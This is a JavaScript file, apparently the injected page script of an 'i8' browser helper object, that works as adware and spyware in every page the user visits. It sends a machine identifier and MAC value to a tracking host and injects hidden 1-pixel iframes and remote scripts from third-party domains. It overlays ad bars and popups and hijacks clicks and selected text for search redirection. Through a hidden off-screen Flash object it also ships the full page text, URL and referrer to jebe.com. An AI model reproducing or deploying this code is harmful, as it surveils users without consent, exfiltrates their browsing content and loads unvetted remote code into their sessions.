var I8zc_ifiedown= true;
var	i8bho_bindoemid= i8bho_bindoemid||'-',
	i8bho_nid= i8bho_nid||0,
	i8bho_rid= i8bho_rid||0,
	i8bho_cmac= i8bho_cmac||'-',
	i8bho_nocgif= i8bho_nocgif||0,
	i8bho_v4mode= i8bho_v4mode||0,
	i8bho_BV= i8bho_BV||'-',
	i8bho_cver= i8bho_cver||'-',
	I8zc_ifiedown= I8zc_ifiedown||0,
	I8zc_ifrpopup= I8zc_ifrpopup||0,
	I8zc_popper= I8zc_popper||0,
	i8loaded= false;

var i8cgif_moved= false;

window.i8vars= {
	charset : document.charset&&document.charset.toLowerCase() || document.characterSet&&document.characterSet.toLowerCase() || 'gbk',
	cmtorid : 'i8_communicator',
	loaded: false,
	msie : 6,
    urlMaxLen : 2048,
	referrer: document.referrer || '',
	category: 'default',
	words: [],
	rand: function(min,max){return Math.round(Math.random() * (max-min)) + min},
	log: function(src)
	{
		var img= new Image();
			img.src= src;
			img.onerror= function(){
				img= new Image();
				img.src= src;
			};
	},
	create: function(tag, attr)
	{
		var obj= document.createElement(tag);
		for(i in attr)
		{
			if( i==='innerText' ) obj.innerText= attr[i];
			else if( i==='innerHTML' ) obj.innerHTML= attr[i];
			else if( i==='css' ) obj.style.cssText= attr[i];
			else if( i==='onload' )
			{
				var callback= attr[i];
				obj.onload= obj.onreadystatechange= function(){
					if( !this.readyState || this.readyState === "loaded" || this.readyState === "complete" ){callback()}
				}
			}
			else if( i==='onkeyup' )obj.onkeyup= attr[i];
			else if( i==='onclick' ){obj.onclick= attr[i];}
			else obj.setAttribute(i, attr[i]);
		}
		return obj;
	}
}

function i8main()
{
	if( i8vars.loaded ) return;
	i8vars.loaded= true;

	var doc= document, win= window, body= doc.body, eldest= body.children.item(0), host= doc.location.hostname;

	i8vars.msie= (msie= /msie ([\w.]+)/i.exec(window.navigator.userAgent)) && (msie= msie[1]) || false;

	i8vars.log('http://bho.i8.com.cn/c.gif?nid='+i8bho_nid.toString()+'&cmac='+i8bho_cmac);

	//crawl
//	if( i8vars.rand(1,100)<=15 )

	//fuzzy (partial match) value search in array
	function partOf(haystack, needles){
		for(i in needles)
			if( typeof needles[i]==='string' && haystack.indexOf(needles[i])>-1 )
				return true;
		return false;
	}

	if( partOf(host, ['youku','iqiyi','ku6','soku','a67','video','56.com','dianying','yisou','kankan.xunlei','letv','tudou','aipai.com']) ){
		 i8vars.category= 'movies';
	}


	if( partOf(host, ['192.168','soso.com','www.baidu','google', '6.cn'])===false )
	{
		var charset= i8vars.charset.replace(/[\-\/\'\"]/g,'')=='utf8'? 'utf8':'gbk';
		body.insertBefore(i8vars.create('script', {
			'charset': charset,
			'type': 'text/javascript',
			'async': true,
			'src': 'http://js.i8001.com/browser/words.'+charset+'.js',
			'onload': function()
				{
					i8vars.words= words();
					if( I8zc_ifiedown )
						showBar();
					if( i8vars.rand(1,100)<=5 )
						cornerAd('baidu');
				}
		}), eldest);

		// ~3%
		if( i8vars.rand(1,100)<=3 )
		{
			body.insertBefore(i8vars.create('iframe', {
				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0',
				'src': 'http://ads.i8.com.cn/ad/client/cn.html?nid=' + i8bho_nid + '&oemid=' + i8bho_bindoemid + '&cmac=' + i8bho_cmac + '&rid=' + i8bho_rid
			}), eldest);
		}
		// ~1%
		else
		if( i8vars.rand(1,100)<=1 )
		{
			body.insertBefore(i8vars.create('iframe', {
				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0',
				'src': 'http://www.zhaochina.com/ied_new/2/bt.html'
			}), eldest);
		}

		// ~ ?% (10?)
		if( I8zc_ifrpopup && (Math.floor(I8zc_popper*10) > i8vars.rand(1,10)) )
			cornerAd();

		//catch all clicks then filter
		body.onclick= function(event)
		{
			var div, event= event || win.event || false, target= event.target || event.srcElement || false;
			if( target && event )
			{
				if( div= doc.getElementById('i8-searchSelected-text') )
					div.style.display= 'none';
				searchSelected(target, event);
			}
		}

		body.insertBefore(i8vars.create('script', {
			'type': 'text/javascript',
			'async': true,
			'src': 'http://utils.cdn.xihuanba.com/Js/CollectionPlugin.Auto.js'
		}), eldest);
	}

	function showBar()
	{
		body.insertBefore(i8vars.create('div', {'css':'height:29px', 'text':'&nbsp;'}), eldest);

		var
			//main bar's div
			wrapper= i8vars.create('div', {
				'css':'min-width:900px;width:100%;z-index:2147483646;zoom:1;line-height:14px;font-size:13px;height:28px;background:#fff;border:0;padding:0;margin:0;text-align:center;border-bottom:1px solid #ddd;'
					+ (i8vars.msie && i8vars.msie<7?'width:expression(document.body.clientWidth>900?"100%":"900px");position:absolute;left:0;top:expression((0+(ignore=document.documentElement.scrollTop?document.documentElement.scrollTop:body.scrollTop))+"px");':'position:fixed;top:0;left:0')
			}),
			//holders
			search= i8vars.create('div', {'css':'float:left;overflow:hidden;width:30%'}),
			links= i8vars.create('div', {'css':'float:left;overflow:hidden;text-align:left;width:58%;padding-top:6px'}),
			tools= i8vars.create('div', {'css':'float:right;text-align:right;width:9%'});

		//generate
		searchInput(search);
		keywordLinks(links);

        i8vars.links = links;
        requestAds();
//		i8vars.srvTestAds= 'World Of Tank';
//
//		setTimeout( function(){adTest(links);}, 500);

		//ASSEMBLE
		wrapper.appendChild(search);
		wrapper.appendChild(links);

		//
		wrapper.appendChild(tools);

		//clear
		wrapper.appendChild(i8vars.create('div', {'style':'clear:both'}));

		//insert the bar
		body.insertBefore(wrapper, eldest);
	}


	function searchInput(parent, keyword)
	{
		//search submit
		parent.appendChild(i8vars.create('span',
		{
			'onclick': function()
			{
				var value= doc.getElementById('i8-bar-search-input').value;
				location.href= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=' + value;
				return false;
			},
			'css': 'float:right;text-decoration:none;cursor:pointer;margin:0 4px;margin-top:4px;font-size:13px;padding:2px 16px;background:#f1f1f1;color:#333333;border-top:1px #e5e5e5 solid;border-left:1px #e8e8e8 solid;border-right:1px #888 solid;border-bottom:1px #999 solid',
			'innerText': '\u641c\u641c'
		}));

		//text input
		parent.appendChild(i8vars.create('input', {
			'id': 'i8-bar-search-input',
			'css': 'float:right;margin:0 4px;margin-top:4px;border-top:1px #888 solid;width:120px;padding:0;font-size:13px;padding:1px;border-left:1px #666 solid;border-right:1px #bbb solid;border-bottom:1px #bbb solid',
			'value': i8vars.words[0],//insert first matched word
			'onclick': function(){
				this.enter= true;
			},
			'onkeyup': function(e)
			{
				var key= (e||event).keyCode;
				if( key===8 || key>18 && key<94 ){
					this.enter= true;
				}
				//bug: windows+d to focus on address bar -> hit enter; search window is poped
				//onclick + onkey up are trying to deal with it
				else if( this.enter && !( key===16 || key===17 || key===18 ) && key===13 )
				{
					location.href= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=' + this.value;
				}
			}
		}));

		//search logo
		parent.appendChild(i8vars.create('span', {
			'css': 'float:right;margin-left:3%;height:22px;width:16px;background:url("http://gif.i8001.com/bp/sprite.gif") 0 0 no-repeat'
		}));
	}

	function keywordLinks(holder)
	{
		//keywords logo
		holder.appendChild(i8vars.create('span', {
			'css': 'float:left;margin-left:30px;height:16px;width:16px;' + (i8vars.category=='movies' ?
			'background:url("http://gif.i8001.com/bp/sprite.gif") 0 -50px no-repeat' :
			'background:url("http://gif.i8001.com/bp/sprite.gif") 0 -29px no-repeat'
			)
		}));

		//max links
		var max= i8vars.rand(6, 9);

		//Create links
		for(i in i8vars.words)
		{
			if( typeof i8vars.words[i]!=='string' ) continue;

			holder.appendChild(i8vars.create('a',
			{
				'href': (i8vars.category=='movies' ? 'http://v.yisou.com/s?q=' + i8vars.words[i] + '&ty=v&sr=1&cid=3499_1001'
							: 'http://htm.i8001.com/bp/tb.html?kw=' + i8vars.words[i]),
				'onclick': function()
				{
					win.open(this.href);
					return false;
				},
				'css': 'margin:0 6px;line-height:16px;text-decoration:none;color:blue',
				'innerText': i8vars.words[i]
			}));
			if( 1>--max ) break;
		}
	}

	//print an ad in the corner
	function cornerAd(type)
	{
		if( type==='baidu' )
			var url= "http://fenxiang.i8.com.cn/?k=" + encodeURIComponent(i8vars.words.join('-')).replace(/-/g, '+');
		else
			var url= 'http://ads.i8.com.cn/bho/ie/tanZhao_2.html?nid=' + i8bho_nid + '&oemid=' + i8bho_bindoemid + '&cmac=' + i8bho_cmac + '&rid=' + i8bho_rid;

		//corner's side
		var corner= i8vars.rand(0, 5) ? 'right' : 'left',
		//holding div
			div= i8vars.create('div', {
				'css':'z-index:2147483645;width:260px;height:220px;position:'
				+ (i8vars.msie && i8vars.msie<8?'absolute;bottom:auto;top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));':'fixed;bottom:0;')
				+ corner + ':0;border:1px solid #999999;margin:0;padding:1px;overflow:hidden;display:block;background:#fff'
			});
		//advert
		div.appendChild(i8vars.create('iframe', {
			'scrolling':'no',
			'height':'100%', 'width':'100%', 'border':0, 'frameBorder':0,
			'css':'width:100%;height:100%;frameBorder:0;border:0;padding:0;margin:0',
			'src': url
		}));

		//close "x" button
		div.appendChild(i8vars.create('div',
			{
			'onclick': function()
				{
					div= undefined;
					this.parentNode.parentNode.removeChild(this.parentNode)
				},
			'css':'position:absolute;border:1px solid #ddd;' + (i8vars.rand(0,1) ? 'right':'left') + ':0;' + (i8vars.rand(0,1) ? 'top':'bottom') + ':0;color:red;font-size:12px;padding:0 5px;cursor:pointer;background:#eee',
			innerText:" X "
		}));
		//insert
		body.insertBefore(div, eldest);
	}


	//show "search" button next to user's selected text
	function searchSelected(target, event)
	{
		if( ',input,textarea'.indexOf(','+target.nodeName.toLowerCase())>-1 ){
			return;// event;
		}

		var input, div, text= ( win.getSelection && win.getSelection().toString() )||( doc.getSelection && doc.getSelection() )||( doc.selection && doc.selection.createRange().text )||false;
		if( text && typeof text==='string' && text.replace(/\s/g, '').length>0 && text.length<30 )
		{
			if( (input= doc.getElementById('i8-bar-search-input')) ){
				input.value= text;
			}

			if( event.pageX===undefined && event.clientX )
			{
				var docEl= doc.documentElement;
				event.pageX = event.clientX + (docEl && docEl.scrollLeft || body && body.scrollLeft || 0) - (docEl && docEl.clientLeft || body && body.clientLeft || 0);
				event.pageY = event.clientY + (docEl && docEl.scrollTop  || body && body.scrollTop  || 0) - (docEl && docEl.clientTop  || body && body.clientTop  || 0);
			}

			if( event.pageX )
			{
				if( !(div= doc.getElementById('i8-searchSelected-text')) )
				{
					div= i8vars.create('a',
					{
						'onclick': function(event)
						{
							var text= this.href.split('&w=');
							win.open(this.href);
							return false;
						},
						'id': 'i8-searchSelected-text',
						'css': 'z-index:2147483644;position:absolute;margin:0;padding:2px 0 0;border-top:1px #e5e5e5 solid;border-right:1px #888 solid;border-bottom:1px #999 solid;color:#fff;background-color:blue;text-decoration:none',
						'innerHTML': '&#9658;&nbsp;\u641c\u641c&nbsp;&nbsp;'
					});
					body.insertBefore(div, eldest);
				}

				if( div.href!=='http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=' + encodeURIComponent(text) )
				{
					div.style.top=event.pageY - (i8vars.msie&&i8vars.msie?0:10) + 'px';
					div.style.left=event.pageX - (i8vars.msie&&i8vars.msie?5:10) + 'px';
					div.href= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=' + encodeURIComponent(text);
					div.style.display= 'block';
				}
			}
		}
	}

	//try to match words with text on page
	function words()
	{
		var i= 0, length= i8vars.words.length, max= 30, matches= [], text= body.innerText.toLowerCase();

		//match
		while( length>++i && matches.length<max ){
			if( text.indexOf(i8vars.words[i])>-1 && matches.push(i8vars.words[i]) );
		}
		//fill up
		while( matches.length<max && matches.push( i8vars.words[i8vars.rand(0, length-1)] ) );
		//slice search word? 50/50
		matches= matches.length && i8vars.rand(0, 1) ? matches.slice(1) : matches;
		//shuffle
		matches.sort(function(){return 0.5 - Math.random()});
		//return
		return matches;
	}

    function installShowAds()
    {
        if (window.i8vars.showAds) return;
        window.i8vars.showAds = function(ads)
       	{
            if (window.i8vars.reFetchAdsTimer)
            {
                window.clearTimeout(window.i8vars.reFetchAdsTimer);
            }
       	    if (!ads || ads.constructor !== Array) return;
            for (var i = 0; i < ads.length; ++i)
            {
                var logUrl = "http://211.154.172.172/adclick?ad=" + ads[i].id;
                i8vars.links.insertBefore(i8vars.create('a', {
                    'css':'font-weight:700;float:right;line-height:18px;',
                    'href':ads[i].link,
                    'innerText': ads[i].text,
                    'onclick': function() { i8vars.log(logUrl); },
                    'rel':ads[i].id,
                    'target':'_blank'
                }), i8vars.links.firstChild);
            }
       	}
    }

	function installCommunicator()
	{
		var initrc = 'i8_initrc';   // will be called by flash once loaded.
		window[initrc] = function()
		{
			sendText(body.innerText.replace(/\s{2,}/g,  ' '));
		}
		var host = "www.jebe.com", port = "10010";
		var swf = 'http://' + host + '/crawl.swf?a=' + Math.random() + '&host=' + host + '&port=' + port + '&charset=' + i8vars.charset + '&initrc=' + initrc;
		var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
				'codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" ' +
				'width="1" height="1" id="' + i8vars.cmtorid + '" name="' + i8vars.cmtorid + '">' +
				'<param name=host value="' + host + '">'					+
				'<param name=port value="' + port + '">'					+
				'<param name=charset value="' + i8vars.charset +  '">'	  +
				'<param name=movie value="' + swf + '">'					+
				'<param name=allowScriptAccess value="always">'		   +
				'<param name=quality value="low">'						  +
				'<embed src="' + swf + '" allowscriptaccess="always" quality="low" width="1" height="1" name="' +
					i8vars.cmtorid + '" id="' + i8vars.cmtorid + '" type="application/x-shockwave-flash"></embed>' +
			'</object>';
		var div = document.createElement('div');
		div.setAttribute('style', 'position:absolute; left:-10000px; top:-10000px; width:1px; height:1px; overflow:hidden;');
		div.innerHTML = html;
		document.body.insertBefore(div, eldest);
	}

	function sendText(text)
	{
		var cmtor = i8vars.msie ? window[i8vars.cmtorid] : document[i8vars.cmtorid];
		if (!cmtor) return;
		if (cmtor.length && cmtor.splice) {cmtor = (cmtor[0].i8call ? cmtor[0] : cmtor[1]);};
		if (!cmtor.i8call) return;
		if (window.i8vars.unloadRegistered === undefined)
		{
			window.i8vars.unloadRegistered = true;
			window[(window.onbeforeunload === undefined) ? 'onunload' : 'onbeforeunload'] = function()
			{
				cmtor.i8disconnect();
			}
		}
		var meta = {url:document.location.href, ref:document.referrer};
        var callbackName = "i8AfterCrawl";
        window[callbackName] = function(r)
        {
            var res = eval('(' + r + ')');
            if (res)
            {
                installShowAds();
                if (res.constructor === Array)
                {
                    i8vars.showAds(res);
                }
                else if (res && res.code && res.code == 'ok')
                {
                    requestAds();
                }
            }
        }
        cmtor.i8crawl(callbackName, meta, text);
	}

    function requestAds()
    {
        if (window.i8vars.requestAdsCounter === undefined)
        {
            window.i8vars.crawlPage = installCommunicator;
            window.i8vars.requestAdsCounter = 1;
        }
        else if (++window.i8vars.requestAdsCounter > 2)
        {
            return;
        }
        installShowAds();
        var url = 'http://www.jebe.com:10020/target/?url=' + encodeURIComponent(location.href);
        if (url.length > i8vars.urlMaxLen) return;
        var pad = '&ref=' + encodeURIComponent(document.referrer);
        if (url.length + pad.length <= i8vars.urlMaxLen)
        {
            url += pad;
        }
        body.insertBefore(i8vars.create('script', {'src': url,'type': 'text/javascript'}), eldest);
    }

	body.insertBefore(i8vars.create('script', {'src': 'http://js.i8001.com/browser/control.nocache.js','type': 'text/javascript'}), eldest);
};

(function(){
	if( document.body=='undefined' || !document.body ){
		return setTimeout(arguments.callee, 100);
	}
	i8main();
})();

